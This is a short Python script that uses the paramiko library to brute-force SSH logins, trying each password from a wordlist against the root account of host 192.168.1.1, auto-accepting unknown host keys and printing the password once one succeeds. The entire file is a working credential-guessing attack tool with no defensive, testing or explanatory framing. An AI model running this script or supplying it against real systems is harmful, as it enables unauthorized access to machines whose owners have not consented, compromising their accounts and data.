import paramiko
import socket

def ssh_bruteforce(host, username, password_file):
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=username, password=password)
                print(f"Password found: {password}")
                return password
            except paramiko.AuthenticationException:
                print(f"Failed password: {password}")
            except socket.error:
                print(f"Connection error for {host}")
                return None
    print("Password not found")
    return None

host = "192.168.1.1"
username = "root"
password_file_path = "passwords.txt"
ssh_bruteforce(host, username, password_file_path)
